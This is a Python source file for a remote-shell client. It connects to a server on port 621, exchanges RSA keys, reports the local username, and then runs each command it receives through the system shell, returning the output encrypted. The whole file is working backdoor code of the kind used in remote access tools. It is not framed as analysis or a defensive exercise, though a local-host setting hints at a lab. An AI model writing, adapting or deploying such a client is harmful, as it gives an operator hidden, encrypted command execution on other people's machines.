import os
import platform
import socket
import subprocess

import rsa

HOST = socket.gethostname()
PORT = 621

class Client:
    def __init__(self):
        # Set up socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((HOST, PORT))

        # Set up client keys
        self.public_key, self.private_key = rsa.newkeys(2048)

        # Receive public key
        size = int.from_bytes(self.socket.recv(4), "big")
        public_key_pem = self.socket.recv(size)
        self.server_key = rsa.PublicKey.load_pkcs1(public_key_pem, format='PEM')
        
        print("Clé publique du serveur :", self.server_key)
        
        # Send public key
        public_key_pem = self.public_key.save_pkcs1(format='PEM') # Encode public key
        self.socket.send(len(public_key_pem).to_bytes(4, "big")) # Send public key length
        self.socket.send(public_key_pem) # Send public key
        
        # Send username
        username = self.get_username().encode()
        encrypted_username = rsa.encrypt(username, self.server_key) 
        self.socket.send(len(encrypted_username).to_bytes(4, "big"))
        self.socket.send(encrypted_username)
        
        # Run client
        self.run()
    
    def run(self):
        while True:
            message = self.recv()
            print(message)
            try:
                self.send(subprocess.run(message, shell=True, capture_output=True, text=True).stdout)
            except Exception as exception:
                self.send(str(exception))

    def get_username(self) -> str:
        if platform.system() == "Windows":
            return os.environ.get("USERNAME", "UnknownUser")

        import pwd
        return pwd.getpwuid(os.getuid()).pw_name
    
    def recv(self):
        size = int.from_bytes(self.socket.recv(4), "big")
        return rsa.decrypt(self.socket.recv(size), self.private_key).decode()
    
    def send(self, message: str | bytes):
        if isinstance(message, str):
            message = message.encode()
        
        encrypted_message = rsa.encrypt(message, self.server_key)
        self.socket.send(len(encrypted_message).to_bytes(4, "big"))
        self.socket.send(encrypted_message)


if __name__ == "__main__":
    client = Client()
